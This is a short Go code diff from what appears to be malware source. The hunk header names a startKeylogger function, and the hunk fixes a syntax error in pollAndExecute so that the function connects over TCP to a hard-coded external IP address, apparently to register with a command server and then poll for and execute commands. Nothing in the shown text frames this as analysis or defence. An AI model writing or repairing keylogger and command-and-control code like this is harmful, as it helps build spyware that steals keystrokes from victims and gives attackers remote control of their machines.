@@ -171,7 +171,7 @@ func startKeylogger() {
 }
 func pollAndExecute(targetID string) error {
 	// 1. REGISTRATION
-	c, err := net.DialTimeout("tcp", 18.184.135.220:8080", 2*time.Second)
+	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
 	if err != nil {
 		return err
 	}
